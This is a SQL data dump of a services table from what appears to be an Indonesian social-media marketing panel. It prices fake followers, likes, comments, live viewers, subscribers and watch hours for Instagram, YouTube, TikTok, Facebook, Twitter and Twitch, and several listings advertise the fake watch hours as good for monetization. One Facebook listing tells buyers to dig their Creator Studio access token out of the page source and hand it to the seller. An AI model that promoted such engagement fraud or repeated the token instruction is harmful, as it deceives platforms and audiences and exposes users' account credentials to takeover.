(203, 26, 'Youtube Live Stream Views stay 24jam nonstop', 'order = berani ambil resiko\ntidak ada alasan reffund apapun itu\ntidak bisa canceled\njangan order jika tidak mau jadi hal tidak dinginkan!\n- Start time : 0 - 10 mins\n- Traffic source : Almost suggested views\n- 10% viewers will stay and stay in 24h\n- Natural , real .', 500, 3000, 85880, 42940, 1, 1, 8576),
(204, 34, 'Instagram Followers Refill S38 [ refill 99 hari ] [ Best seller ] ', 'Garansi 99 hari\nhanya refill kalo yg drop dari layanan kami\nrefill habis jika layanan tidak tersedia lagi', 10, 1000000, 57000, 28500, 1, 1, 8577),
(205, 10, 'instagram view MP 21 [ Accept Video / TV / Reel ] CHEAPEST FAST', 'FAST\nCHEAPEST', 100, 1000000000, 380, 190, 1, 1, 8578),
(206, 38, 'Instagram Followers Refill S39 [ refill 365days ] FAST♻️', 'Start: 0-1Hrs\nSpeed: 2k-5k/days\nRefill: 365 days', 10, 1000000, 25650, 12825, 1, 1, 8579),
(207, 16, 'Instagram Likes Server 12 [ LESSDROP ] [ HQ Refill 45days ] ♻️', 'Fast\nkualitas bagus\nStart: 0-1 jam', 10, 50000, 5320, 2660, 1, 1, 8580),
(208, 42, 'Twitter Followers Server 13 [ 30 days refill ] FAST⚡️⚡️', 'waktu mulai 0-6 jam', 10, 200000, 353400, 176700, 1, 1, 8581),
(209, 17, 'Instagram Followers Indonesia S15 [ 5K ] BONUS++', 'jika dapat bonus alhamdulillah\njika tidak jangan kompline\nproses 1-3 hari\nBOT INDO', 200, 5000, 32300, 16150, 1, 1, 8582),
(210, 18, 'Instagram Likes Indonesia MP 10 [ MAX 1K ] BONUS++ [ NOT SUPPORT REEL ]', 'jika dapat bonus alhamdulillah\njika tidak jangan kompline\nproses 1-24 jam\njika blm 24 jam jangan kompline\nBOT INDO\n\ntidak bisa untuk reels', 100, 4000, 12160, 6080, 1, 1, 8583),
(211, 29, 'Instagram Followers Server 2 [ Refill 30days ] [ Real ]', 'kami garansi 30 hari\n\nmulai: 0-1jam\nFastest\nHigh Quality', 10, 50000, 34200, 17100, 1, 1, 8584),
(212, 33, 'Youtube Subscribe VIP 7 [ 30Days refill ] [NO DROP] ', 'order 1000 subs kemungkinan siap dalam 9-12 hari\n- Waktu mulai: 0 - 1jam \n- refill: 30 hari\n- 100% pengguna nyata\n- Hampir NON DROP\n\nJika jumlah subs disembunyikan Anda tidak akan mendapatkan jumlah awal\ndan jika tidak masuk subs kami tidak bertanggung jawab\nGunakan tautan saluran atau video ( KEDUANYA DITERIMA)\n', 100, 5000, 1843000, 921500, 1, 1, 8585),
(213, 33, 'Youtube Subscribe VIP 8 [ 30Days refill ] [NO DROP] Speed 30+-/D', '- Start time : 0 - 2h\n- Speed : 30+ / day\n- NON DROP\n- Guarantee: 30 days\n- Min 100 - Max 6k\n- Good subs.', 20, 6000, 1558000, 779000, 1, 1, 8586),
(214, 33, 'Youtube Subscribe SERVER 16  [ Refill 30days ] [ FAST ] ', '1000 Subscriber /day\n30 days Guarantee\ndrop - 10-70%\nGampang drop!\nNo Refund, Only Refill', 50, 5000, 437000, 218500, 1, 1, 8587),
(215, 46, 'Facebook Video Views Server 3 [ Monetization ] [  PAKET 600k menit ]', '- Start time: 0-24 H ( it Might need 0-72 Hours if there are Update or Overload )\n- Speed 50k-100k hours per day ( this speed is approximate and it may change depending on overload and updates )\n- Video must be at least +2Hours ( you can use an old live video posted on your timeline )\n- Monitizable Views\n- Example Order Format: https://www.facebook.com/user/videos/ID\n\nImportant Requirement: Go to the page: \" https://business.facebook.com/creatorstudio/?tab=monetization_home&collection_id=free_form_collection \", press Ctrl + U and search ( Ctrl + f ) for the keyword \"EAAciLZ\", copy the entire token here', 10000, 10000, 349600, 174800, 1, 1, 8588),
(216, 46, 'Facebook Video Views Server 4 [ No Refill ]  [Speed: 100K/Day]', 'tidak ada garansi\nStart Time: Instant\nSpeed: Up to 100K/ day\nRefill: No refill / No refund\nSpecs: High Quality - 2 to 30 Minutes Video Watch Time !', 5000, 10000000, 163400, 81700, 1, 1, 8589),
(217, 47, 'Twitter Likes MP 1 [ No Refill ] Max 5K ', 'No Refill\nSped - 5k/day', 10, 5000, 73720, 36860, 1, 1, 8590),
(218, 47, 'Twitter Likes MP 2 [ 30days Refill ] Max 5K USA', 'slow', 20, 5000, 96140, 48070, 1, 1, 8591),
(219, 47, 'Twitter Likes MP 3 [ NO Refill ] FAST [HQ]', 'selesai 1000\nkemungkinan tidak sampai 6 jam an\ntetap tunggu 1x24 jam', 10, 2500, 216600, 108300, 1, 1, 8592),
(220, 29, 'Instagram Followers Server 3 less Drop [ Refill 30days ] ', 'Accounts with Avatars and Posts.\nAuto-Refill up to 100% within a month. |\nCancel Button Enable\n\nCurrent speed: 26,890 per hour.\nDrop Ratio is: ~14%\n\nMost Affordable Price in Market\nOur Aim is to Give Best Quality to Our ALL Customer in Lowest Rate', 10, 50000, 22420, 11210, 1, 1, 8593),
(221, 45, 'Instagram Like Komentar Indonesia [ BACA Deskripsi ]', 'untuk order di web \ntarget masukin link poto\nLink Post masukin username\n\nuntuk order Via API\nparameter target masukin link poto\nparameter custom_link masukin username\n\nkualitas bot hq\nproses 0-6 jam jika komentar pada postingan tidak sampai 10rb\ntapi tidak menutup kemungkinan proses bisa max 3 hari', 100, 100000, 57000, 28500, 1, 1, 8594),
(222, 48, 'Youtube GEO views No Refill [ Indonesia ] ', 'NO KOMPLINE\nkualitas : Normal \nwaktu mulai : 0 - 24 jam\nSpeed: Instant\nRetention: 15s Up To +50 detik\nRefill: No Refill / Dapat Mengalami Penurunan Besar\nGood untuk Youtube Algorithm\nHigh Retention Rate', 1000, 5000000, 62320, 31160, 1, 1, 8595),
(223, 33, 'Youtube Subscribe SERVER 17 [ Lifetime Guarantee ] 15-25/day', 'Instan\nCatatan - Kecepatan tinggi jika Anda memesan pelanggan dalam jumlah besar. Akun kecil atau hingga 500 pelanggan mungkin memerlukan waktu maksimal 24 jam untuk dikirimkan.\nTidak seperti jika kecepatan yang disebutkan adalah 1k/hari kecepatan per jam akan menjadi sekitar 50 , tetapi kecepatan akan dibagi rata pada semua pesanan tetapi untuk pesanan besar akan didedikasikan dan diselesaikan dengan cepat.\nPengguna Nyata\nLifetime Guarantee\nless Drop [20-30%]\n\nHarap Dicatat Saat ini pelanggan youtube tidak berfungsi seperti yang dijelaskan. jika Anda ingin membatalkan pesanan Anda, kami dapat melakukannya untuk Anda, tetapi kami tidak memiliki perkiraan kecepatan/waktu mulai yang TEPAT.', 10, 30000, 1368000, 684000, 1, 1, 8596),
(224, 42, 'Twitter Followers Server 16 [ 30 days refill ] FAST CHEAP⚡️ ', 'Instant\nR30 [ after requesting it may take 24-48h to start ]\n1K/Day\nQuality All profiles with profile pictures real looking', 20, 1000, 220400, 110200, 1, 1, 8597),
(225, 15, 'Shopee Likes Produk Indonesia [ Max 25K ] [BONUS 5%] MURAH ', 'High Quality\nInstan\nNO DROP', 50, 10000, 19000, 9500, 1, 1, 8598),
(226, 23, 'Facebook Photo / Post Likes Server 1 [ No Refill ] [ 300/hour ]', 'Instant\nKecepatan: 200-1000/jam (Semakin besar pesanan, semakin cepat tingkat pertumbuhannya)\nKecepatan dapat bervariasi jika kelebihan beban mungkin sangat lambat. tetapi dapat didorong sesuai permintaan\nDrop: 10-20%\nNo refill/refund', 100, 100000, 24700, 12350, 1, 1, 8599),
(227, 23, 'Facebook Photo / Post Likes Server 2 [ No Refill ] [ 5k/day ]', 'Instan\n1000 likes/1 kali order (bisa dipesan 20 kali).\nwaktu penyelesaian adalah 6-12 jam\nDrop: 5-15% [ jika drop diatas itu tetap tidak ada garansi ]\n[No Refill', 50, 1000, 33820, 16910, 1, 1, 8600),
(228, 23, 'Facebook Photo / Post / Video Likes Server 3 [ 30days Refill ] [ 3k/day ] ', 'Link: https://www.facebook.com/zuck/posts/10114380064791681\nStart: Within 0 to 1 Hrs, Pls allow 6-12 hours.\nSpeed: 1000 to 10000 per 24 hours\nRefill: 30days\n\nURL Format: Photo/Video/Status Link\nQuality: Real\nGuarantee: 30days Guarantee', 10, 5000, 79800, 39900, 1, 1, 8601),
(229, 23, 'Facebook Photo / Post Likes Server 4 [ 45days Refill ] [ REAL ] ', 'REAL negara luar\n0-3 jam mulai!\nTanpa Drop! Garansi Isi Ulang 45 Hari.\nKecepatan Harian 3K\nHalaman, Grup, Profil Semua Tautan Terima.\nCONTOH LINK: https://www.facebook.com/zuck/posts/10114380064791681', 100, 10000, 87400, 43700, 1, 1, 8602),
(230, 17, 'Instagram Followers Indonesia S19 [ max 500 murah real ] Refill 3days', 'BONUS 15-20%\nREAL', 100, 1000, 133000, 66500, 1, 1, 8603),
(231, 18, 'Instagram Likes Indonesia MP 11 [LANGSUNGMASUK] [ NODROP] [30K] REAL ACCOUNT BONUS 20% [ Refill 3Days ]', 'IMPRESSION + REACH + PROFILE VISIT\nFAST\nRefill 3Days', 20, 1000, 26600, 13300, 1, 1, 8604),
(232, 20, 'TikTok Likes MP 13 [ REFILL 30D ][Speed: 2K/Day]', 'waktu mulai 0-2 jam\nkualitas REAL tidak BOT tapi akun luar', 10, 50000, 83600, 41800, 1, 1, 8605),
(233, 5, 'Instagram Impressions Server 1 MURAH CEPAT', 'Instant\nFrom hashtags , Home , Profile & Other\nSuper Fast Delivery', 100, 5000000, 2546, 1273, 1, 1, 8606),
(234, 29, 'Instagram Followers Server 4 LessDrop [ Refill 30D ] [ 1-5k/days]', 'waktu mulai 0-1jam\n1k-5k/day\nLess Drop', 50, 100000, 15580, 7790, 1, 1, 8607),
(235, 34, 'Instagram Followers Server 5 LessDrop [ Refill 99days ] [30-50k/day]', 'masa garansi 99 hari refill di tiket\n0-1h\n30-50k/day\n5-10% drop maximum\nBest Quality', 10, 1000000, 19380, 9690, 1, 1, 8608),
(236, 25, 'TIKTOK View Server 4 Emergency', 'waktu mulai 0-12 jam', 10, 25000000, 5890, 2945, 1, 1, 8609),
(237, 49, 'Tiktok 1 Comments random [ Akun centang biru/ VERIFIED ] EKLUSIVE MEDANPEDIA', 'proses 2-7 hari\nno refill', 1000, 1000, 68400, 34200, 1, 1, 8610),
(238, 42, 'Twitter Followers Server 17 [ 30 days refill ] FAST CHEAPEAST⚡️ ', 'R30\nFAST', 100, 5000, 85500, 42750, 1, 1, 8611),
(239, 38, 'Instagram Followers Server 6 HQ [ Refill 365days ] [ Fast ] ', 'Fast \nRefill 365days', 10, 1000000, 26220, 13110, 1, 1, 8612),
(240, 34, 'Instagram Followers Server 7 [ Refill 99days ] [ 30-50k/day]', '99 Days Refill\n30-50k/day\nRefill button enabled', 10, 5000000, 23940, 11970, 1, 1, 8613),
(241, 38, 'Instagram Followers Server 8 [ Refill 180days ] [ 30-50k/day] ( Recommended Service )', 'Speed 50K/day\nHQ Followers\nRefill: 180 Days ( Auto-Refill is Enable for 30 Days )\nDrop Ratio Below 0.5%', 10, 1000000, 30400, 15200, 1, 1, 8614),
(242, 10, 'instagram view Server 3 [ TV/VIDEO/REELS] INSTANT', 'Fast', 100, 2000000000, 182.4, 91.2, 1, 1, 8615),
(243, 26, 'Youtube Live Stream Views Live Stable Upto 50 Minutes', 'Stable 40-50 Minutes\nLive Streaming Mulai Rata-rata dalam 5-7 Menit\nSetelah Streaming Mulai\nView Langsung Akan Meningkat Perlahan Dan Akan Stabil Selama Live Viewer Hingga 50+ Menit Akan Meningkat\n\nHingga 200+ Live Viewer pada 2000 Streaming Pesanan\n\nPembeli Akan Mendapatkan Hingga 10% Live Viewer Selama Hingga 50 Menit\n( SEMUA Catatan ada di Pengujian dan Estimasi Kami, ini dapat bertambah atau berkurang menurut Update Youtube )\n( pesan kelipatan 100, Jangan order 2150 atau 2650 Order Seperti ini )\n', 2000, 500000, 26600, 13300, 1, 1, 8616),
(244, 33, 'Youtube Subscribe SERVER 18 [ No drop ] [ refill 30day ] 40/day ', 'Good subs- Start time : 0 - 2h\nSpeed : 30 - 60 / day\nNON DROP\nGuarantee: 30 days\nMin 20 - Max 6k', 20, 6000, 1292000, 646000, 1, 1, 8617),
(245, 26, 'Youtube Live Stream Views stay 24jam [ BETA 1 murah ]', '- Order 1000 views kamu dapat 75 - 300 live views stay di live mu 24jam\n- Order 2000 views kamu dapat 175 - 600 live views stay di live mu 24jam\n- Order 3000 views kamu dapat 275 - 900 live views stay di live mu 24jam\n\nCatatan :\n- Harap teruskan siaran langsungmu, Jangan segera mengakhiri siaran langsung. Jika video dihapus atau segera berakhir maka kami tidak dapat reffund/cancel.\n- Setelah order, tidak ada reffund.\n- tidak bisa cancel apapun itu alasannya\n- tidak ada refund apapun itu alasannya\norder = ambil resiko', 500, 4000, 87400, 43700, 1, 1, 8618),
(246, 9, 'Youtube Views Server 11 [ R30 ] [ NO drop ]', 'dalam pengujian kami \nLayanan ini belum ada drop\n20k/days', 5000, 10000000, 95000, 47500, 1, 1, 8619),
(247, 50, 'Twitch  Live Views [FOR 10 MINUTES] Fast', 'Start: Instant\nTIDAK ADA REFILL / REFUND jika Anda menghentikan streaming lebih awal bahkan setelah 1 menit, harap beli dengan hati-hati.', 100, 2000, 266000, 133000, 1, 1, 8620),
(248, 50, 'Twitch Live Views [FOR 20 MINUTES] Fast ', 'Start: Instant\nTIDAK ADA REFILL / REFUND jika Anda menghentikan streaming lebih awal bahkan setelah 1 menit, harap beli dengan hati-hati.', 100, 2000, 532000, 266000, 1, 1, 8621),
(249, 50, 'Twitch Livestream Views 30 mins', 'Start: Instant\nTIDAK ADA REFILL / REFUND jika Anda menghentikan streaming lebih awal bahkan setelah 1 menit, harap beli dengan hati-hati.', 20, 500, 608000, 304000, 1, 1, 8622),
(250, 51, 'Facebook Emoticons Post Likes [ Love ] [Non Drop]', 'Instan\nnon drop', 50, 1000, 39900, 19950, 1, 1, 8623);
INSERT INTO `services` (`id`, `category_id`, `service_name`, `note`, `min`, `max`, `price`, `profit`, `status`, `provider_id`, `provider_service_id`) VALUES
(251, 51, 'Facebook Emoticons Post Likes [ HaHa ] [Non Drop] ', 'Instan\nnon drop', 50, 1000, 39900, 19950, 1, 1, 8624),
(252, 51, 'Facebook Emoticons Post Likes [ WoW ] [Non Drop] ', 'Instan\nnon drop', 50, 1000, 39900, 19950, 1, 1, 8625),
(253, 51, 'Facebook Emoticons Post Likes [ Sad ] [Non Drop] ', 'Instan\nnon drop', 50, 1000, 39900, 19950, 1, 1, 8626),
(254, 51, 'Facebook Emoticons Post Likes [ Angry ] [Non Drop] ', 'Instan\nnon drop', 50, 1000, 39900, 19950, 1, 1, 8627),
(255, 51, 'Facebook Emoticons Post Likes [ Love ] [Non Drop] [ max 50k ] fast', 'instan \n5k/jam\nnondrop', 50, 50000, 48640, 24320, 1, 1, 8628),
(256, 51, 'Facebook Emoticons Post Likes [ Care ] [Non Drop] [ max 50k ] fast ', 'instan\n5k/jam\nnondrop', 50, 50000, 48640, 24320, 1, 1, 8629),
(257, 51, 'Facebook Emoticons Post Likes [ HaHa ] [Non Drop] [ max 50k ] fast', 'instan\n5k/jam\nnondrop', 50, 50000, 48640, 24320, 1, 1, 8630),
(258, 51, 'Facebook Emoticons Post Likes [ WoW ] [Non Drop] [ max 50k ] fast ', 'instan\n5k/jam\nnondrop', 50, 50000, 48640, 24320, 1, 1, 8631),
(259, 51, 'Facebook Emoticons Post Likes [ Sad ] [Non Drop] [ max 50k ] fast ', 'instan\n5k/jam\nnondrop', 50, 50000, 48640, 24320, 1, 1, 8632),
(260, 51, 'Facebook Emoticons Post Likes [ Angry ] [Non Drop] [ max 50k ] fast ', 'instan\n5k/jam\nnondrop', 50, 50000, 48640, 24320, 1, 1, 8633),
(261, 24, 'Instagram Followers Server 21 [ NEW ] MURAH! ', 'MURAH\nProses lama!', 20, 5000, 3876, 1938, 1, 1, 8634),
(262, 25, 'TIKTOK View Server 8 GUARANTED 30D', '100k-1M/Days', 100, 10000000, 1197, 598.5, 1, 1, 8635),
(263, 21, 'Youtube Like MP 12 Cheapest [ No refill ] [ No Drop ] ', 'Instan dan Cepat ( Kualitas Tinggi )\nMin 100 dan Max 100k\n( Tidak Ada Drop Sejak 90 Hari )\nIni Layanan no refill jika suatu saat drop tidak ada garansi!\n\nMedanpedia Tujuannya adalah Memberikan Harga Paling Terjangkau di Pasar', 10, 100000, 17100, 8550, 1, 1, 8636),
(264, 21, 'Youtube Like MP 13 Cheapest [ 30 Days Refill ]', 'Instant and Fast ( High Quality )\n30 Days Refill', 10, 100000, 26600, 13300, 1, 1, 8637),
(265, 42, 'Twitter Followers Server 19 [ No refill ] CHEAPEAST ', 'Instant\n2-3k/jam', 10, 10000, 50540, 25270, 1, 1, 8638),
(266, 52, 'Facebook Likes Server 2 [Reels Short Video] [ 10k/day ] ', '10k/day\nLink Format: https://www.facebook.com/username/videos/xxxxxxxxxx/', 100, 100000, 35530, 17765, 1, 1, 8639),
(267, 52, 'Facebook Likes Server 3 [Reels Short Video] [ 5k/day ] [ No Drop ]', '5k/day\nLink Format: https://www.facebook.com/username/videos/xxxxxxxxxx/', 100, 50000, 43700, 21850, 1, 1, 8640),
(268, 47, 'Twitter Likes MP 4 [ NO Refill ] FAST [HQ] [ 20/10k ]', 'waktu mulai 0-1 jam', 20, 10000, 68020, 34010, 1, 1, 8641),
(269, 24, 'Instagram Followers MP 3 [ no refill max 20k ] ', 'fast', 100, 20000, 9310, 4655, 1, 1, 8642),
(270, 24, 'Instagram Followers MP 4 EKLUSIVE [ REAL HQ ] LESS DROP ', 'INSTANT\ndrop maksimal 5-15% saja\n1k-3k/day\nmax pesan saya buat 5.000 jika sudah sukses status, bisa order lagi\nmax per akun bisa isi sampai 20ribu followers\n\nBisa minta refill jika drop diatas 20%\ntetapi refill ini sifatnya random\nbisa refill bisa tidak\nlayanan tetap no refill!\njadi jika suatu saat drop gk bisa refill jangan banyak kompline', 100, 5000, 24320, 12160, 1, 1, 8643),
(271, 23, 'Facebook Photo / Post Komentar Server 2 [ 24 - 48 jam delivery ] [ CUSTOM ]', '24 - 48 jam delivery', 10, 600, 1862000, 931000, 1, 1, 8644),
(272, 23, 'Facebook Photo / Post Komentar Server 3 [ max 1k ] [ CUSTOM ] ', 'Link: Follow the description\nStart: 0-6hrs\nSpeed: 100-500/days\nRefill: 30 days\n\nQuality: High Quality\nQuantity: Min 10, Max 600', 10, 1000, 1672000, 836000, 1, 1, 8645),
(273, 9, 'Youtube Views Server 13 [ 100K/Day ] Lifetime Guarantee [ Short and Long Video Both Accepted ]', 'INSTANT START', 100, 50000000, 41800, 20900, 1, 1, 8646),
(274, 38, 'Instagram Followers Server 10 [ Refill 365D ] [ 400-500k/day ] EKLUSIVE', 'Speed 400-500K / day\nRefill 365 Days\nada bonus followers jika hoki', 100, 500000, 14060, 7030, 1, 1, 8647),
(275, 9, 'Youtube Views Server 14 [ No refill ]  TERMURAH', 'Max 5000\nNo kompline apapun!\norder = berani ambil resiko', 50, 5000, 13300, 6650, 1, 1, 8648),
(276, 19, 'TIKTOK FOLLOWERS Server 3 [ Lifetime guaranted ] [ BEST SELLER ]', 'Real and Active Followers and Likes\nProses 1x24 jam', 5, 100000, 167200, 83600, 1, 1, 8649),
(277, 19, 'TIKTOK FOLLOWERS Server 6 [ 30 dayst guaranted ] 3K/Days', '3K/Days \nestimasi bisa lebih lama karna overload dan ada perubahan sistem tiktok\nInstant Start', 10, 30000, 125400, 62700, 1, 1, 8650),
(278, 50, 'Twitch Followers Server 1 [ Max 150K ] [ Speed 1-5k ]  R30days', 'FAST', 100, 150000, 41800, 20900, 1, 1, 8651),
(279, 50, 'Twitch Followers Server 2 [ Max kK ] [ Speed 5K/D ] ', 'FAST', 20, 5000, 12920, 6460, 1, 1, 8652),
(280, 50, 'Twitch Followers Server 3 [ Max 50K ] [ Speed 5K/Day ] AUTO REFILL 15D ', 'AUTO REFILL 15 DAYS', 100, 50000, 51300, 25650, 1, 1, 8653),
(281, 33, 'Youtube Subscribe SERVER 19  [ 30 days guarantee ] [ Bonus Views ] RECOMMENDED', 'Speed - 300-500/day\n30 Days guarantee\nDrop 5%', 100, 5000, 1672000, 836000, 1, 1, 8654),
(282, 33, 'Youtube Subscribe SERVER 20 [ 30 days guarantee ] [ 300/day ]', '30 Days Refill\nSpeed 1k-5k/ Day\n0-1 hour Start\nRefill Button Enabled\nStart - 0-12 hours\nDrop Ratio: 10-20%', 400, 5000, 1178000, 589000, 1, 1, 8655),
(283, 33, 'Youtube Subscribe SERVER 21 [ 30 days guarantee ] [ 500/day ] ', '30 Days Guarantee\nMin 500 Max 5000\nSpeed 500-1k/day\n30 Days Guarantee\nStart - 0-24 hours [ Do not ask cancel before 24 hours]', 100, 5000, 1026000, 513000, 1, 1, 8656),
(284, 42, 'Twitter Followers Server 20 [ No refill ] SuperInstant ', 'Instant, tapi bisa aja lambat saat overload atau ada update twitter\nSpeed: 20K/Day', 10, 20000, 49400, 24700, 1, 1, 8657),
(285, 42, 'Twitter Followers Server 21 [ Refill 30D ] SuperInstant ', 'Instant, tapi bisa aja lambat saat overload atau ada update twitter\nSpeed: 20K/Day', 10, 20000, 60800, 30400, 1, 1, 8658),
(286, 26, 'Youtube Live Stream Views [ Working ] [Fast service] [ 15 MInutes ]', 'Start in 3-5 minutes\nConcurrent Live will be ( 70-100% )\nNo Cancellation issue\n( If Video Deleted, Buyer Will Get Partial Refund )', 300, 2000, 1026000, 513000, 1, 1, 8659),
(287, 26, 'Youtube Live Stream Views [ Working ] [Fast service] [ 30 MInutes ] ', 'Start in 3-5 minutes\nConcurrent Live will be ( 70-100% )\nNo Cancellation issue\n( If Video Deleted, Buyer Will Get Partial Refund )', 300, 2000, 2014000, 1007000, 1, 1, 8660),
(288, 26, 'Youtube Live Stream Views [ Working ] [Fast service] [ 60 MInutes ] ', 'Start in 3-5 minutes\nConcurrent Live will be ( 70-100% )\nNo Cancellation issue\n( If Video Deleted, Buyer Will Get Partial Refund )', 300, 2000, 2660000, 1330000, 1, 1, 8661),
(289, 17, 'Instagram Followers Indonesia S22 [ REAL AKTIF ] [ 5K ] [ REFILL 7 DAYS ]', 'Real Indonesia\nNo refund\nProses max 1x24 jam\ndilimit pesanan perhari 500-1000\nkemungkinan kalo gk bisa pesan kenak limit harian\nsilahkan dicoba keesokan harinya\n\nSebelum anda membeli:\n- Pastikan username / link data yang di input benar dan valid,\n- Jangan input data yang sama dengan orderan sebelum nya apabila orderan sebelum nya belum Completed,\n- Apabila orderan tidak mengalami perubahan status, silahkan buat sebuah tiket bantuan baru untuk di tangani,\n- Tidak ada pengembalian dana untuk kesalahan pengguna.', 50, 1000, 68400, 34200, 1, 1, 8662),
(290, 4, 'Instagram Live Video Views [ Durasi 60 Menit ] INSTANT', 'INSTANT', 10, 5000, 513000, 256500, 1, 1, 8663),
(291, 1, 'SoundCloud Plays [Max: 10M]', 'Start Time: Instant - 12 hours\nSpeed: 3 to 5mil/ day\nSpecs: Full Link !', 50000, 1000000000, 1254, 627, 1, 1, 8664),
(292, 33, 'Youtube Subscribe SERVER 22 [ 30 days guarantee ] [ NON DROP ] Speed 150/D', '- Start time : 1 - 24h\n- Speed up to 100 / day (The average speed per day is 30-100!)\n- if the speed is less than 100 per day, partial is possible!\n- Real user\n- Guarantee: 30 days\n- Min 50 - Max 5k\n- Order channel url https://www.youtube.com/channel/xxxx , channel must show number of subs\n\nNOTE : if channel : Hide number of subs, restricted, changing username, old drop , channel delete, etc. The order will be completed due to reasons preventing shipping. In this case , take long time to cancel', 100, 5000, 1368000, 684000, 1, 1, 8665),
(293, 16, 'Instagram Likes Server 19 [ 50k/day ] [  REAL ] ', '50k/hari\nkemungkinan 10% Drop saja \ntidak ada isi ulang untuk kasus terburuk.', 10, 50000, 4180, 2090, 1, 1, 8666),
(294, 16, 'Instagram Likes S1 [ FAST MURAH ]', 'Superfast\nNo refill', 20, 20000, 2622, 1311, 1, 1, 8667),
(295, 16, 'Instagram Likes S2 [ FAST No Drop ] 500/hour ', 'waktu mulai 0-1j\nkecepatan 500+/jam\nNodrop\nTidak ada refill jika ada update terburuk', 50, 1000000, 4180, 2090, 1, 1, 8668),
(296, 9, 'Youtube Views S1 [ 3-4k/day ] + bonus likes + Traffic Source- External + Direct [ Lifetime Guarantee ]', 'Lifetime Guarantee', 100, 120000, 44460, 22230, 1, 1, 8669),
(297, 9, 'Youtube Views S2 [ 2-5k/day ] + bonus likes + Traffic Source- Mixed [R30]', 'Refill 30 days', 100, 160000, 27740, 13870, 1, 1, 8670),
(298, 15, 'Shopee Video Like Indonesia [ Max 15K ] [BONUS 5%] MURAH ', 'Maksimal proses 24 jam\nMasukkan Link shopee video\nNo refund jika double order dan yg masuk hanya 1 orderan, silahkan tunggu sampai orderan sebelumnya berstatus Success', 50, 15000, 24700, 12350, 1, 1, 8671),
(299, 9, 'Youtube Views S3 [ 20K/day ] + Suggested [ Lifetime Guarantee ] ', '20K/day', 100, 500000, 39900, 19950, 1, 1, 8672),
(300, 10, 'instagram view Server 8 [ TV/VIDEO/REELS] [UPDATED WORKING] CHEAP ', 'Max 10Juta', 100, 10000000, 2356, 1178, 1, 1, 8673),
(301, 9, 'Youtube Views S4  [ Good For Ranking ] Life Time Guaranteed', 'Source : Mobile Devices - Android\nSpeed 50-100k Per Day\nRetention : 20-50 Second\nInstant Start', 1000, 100000000, 57000, 28500, 1, 1, 8674),
(302, 9, 'Youtube Views S5  [ 60K/day - Suggested Views + 2-3% Bonus LIKES ]', 'Speed 40K/day\n60 Days FreeRefill IN case drop\nSource : Suggested Videos\n2-3% Bonus Likes ( Free with Views )\nInstant Start', 100, 9000000, 39900, 19950, 1, 1, 8675),
(303, 21, 'Youtube Like MP 14 Cheapest Indonesian [ 30 Days Refill ] Instant ', 'Instant Start\nBest Quality with World Cheapest Price )\n30 Days Free Refill if You Found Single Likes Drop', 10, 1000000, 18620, 9310, 1, 1, 8676),
(304, 36, 'TIKTOK Share MP 3 MAX 100jt TERMURAH', '10/10M', 10, 100000000, 1254, 627, 1, 1, 8677),
(305, 33, 'Youtube Subscribe S2 [ Lifetime Guaranteed ] Best for Monetization', 'Target : Youtube Channel Link\nLokasi : Global\nWaktu Penyelesaian: 0-24 Jam, Dapat diperpanjang hingga 72 jam dalam Intensitas.\nkemungkinan 10k/days\n\nCatatan:\n Saat layanan Overload, kecepatan awal proses berubah.\n Jangan melakukan pemesanan kedua pada link yang sama sebelum pesanan Anda Sukses di sistem.\n Jika ada masalah dengan layanan, silakan hubungi Tiket.', 200, 1000000, 1349000, 674500, 1, 1, 8678),
(306, 36, 'TIKTOK Share MP 4 MAX 1jt TERMURAH BONUS VIEW', '100K/Day', 300, 1000000, 342, 171, 1, 1, 8679),
(307, 33, 'Youtube Subscribe S3 [ Refill 30 days ] EXCLUSIVE', 'waktu mulai : 0-30min\nKecepatan : 100-200/day\nDrop : Non drop ( kalau terjadi drop kemungkinan hanya 5% )\nRefill : 30 days', 100, 5000, 722000, 361000, 1, 1, 8680),
(308, 10, 'instagram view Server 3 SUPERFAST [ TV/VIDEO/REELS] ', 'SUPERFAST', 100, 1000000, 4180, 2090, 1, 1, 8681),
(309, 10, 'instagram view Server 4 SUPERFAST [ TV/VIDEO/REELS]  Recommended ', 'Best Service in the World\nGaransi seumur hidup jika drop', 100, 5000000, 3420, 1710, 1, 1, 8682),
(310, 10, 'instagram view Server 9 FAST [ VIDEO/TV/REELS ] Max 1M ', '0-15 Minutes', 100, 5000000, 2128, 1064, 1, 1, 8683),
(311, 16, 'Instagram Likes S7 [ Max 100K ] + Bonus', 'Instan\nno drop\njika ada masalah tentang ig dan drop, tetap no garansi', 100, 100000, 1824, 912, 1, 1, 8684),
(312, 18, 'Instagram Likes Indonesia MP 12 FAST REAL ACCOUNT [ REFILL 7 DAYS ]', 'Real Indonesia\nFAST\nProses max 1x24 jam\ndilimit pesanan perhari 500-1000', 50, 2000, 26980, 13490, 1, 1, 8685),
(313, 33, 'Youtube Subscribe S7 [ 90 days refill ] [ Speed Up to 100/Day ]', 'waktu mulai 0-6 jam', 50, 10000, 748600, 374300, 1, 1, 8686),
(314, 31, 'Youtube Views S6 [ Jam Tayang ] [ 15 Minutes Video ] [ G30 ] [  NON DROP ] [ BACA Deskripsi ] Fastest ', 'New watch Hours 100% Non-Drop\nGood For Monetization\nSpeed: 1000 Per Hour\nGuarantee: 30 Days refill\n\nSource: Mostly Suggested videos\n\nUse 15 Minute + Lenght Video To Get Full Watch Hours\nOrder 1000 = 250 Hours', 100, 16000, 121600, 60800, 1, 1, 8687),
(315, 31, 'Youtube Views S7 [ Jam Tayang ] [ 30 Minutes Video ] [ G30 ] [ NON DROP ] [ BACA Deskripsi ] Fastest ', 'New watch Hours 100% Non-Drop\nGood For Monetization\nSpeed: 1000 Per Hour\nGuarantee: 30 Days refill\nSource: Mostly Suggested\nUse a Minimum 30 Minute Video To Get Full Watch Hours\nOrder 1000 = 500 Hours', 100, 8000, 207100, 103550, 1, 1, 8688),
(316, 31, 'Youtube Views S8 [ Jam Tayang ] [ 60 Minutes Video ] [ G30 ] [ NON DROP ] [ BACA Deskripsi ] Fastest ', 'New watch Hours 100% Non-Drop\nSpeed: 1000 Per Hour\nGuarantee: 30 Days refill\nSource: Mostly Suggested\nUse a Minimum 60 Minute Video To Get Full Watch Hours\nOrder 1000 = 1000 Hours', 100, 4000, 296400, 148200, 1, 1, 8689),
(317, 16, 'Instagram Likes S7 [ No refill ] [ 20k/day ] Real Mixed', '20k/day', 10, 50000, 1520, 760, 1, 1, 8690),
(318, 20, 'TIKTOK Likes Server 8 [ Refill 30 Days ]  Speed 10K/Day', 'max 10k', 100, 10000, 38760, 19380, 1, 1, 8691),
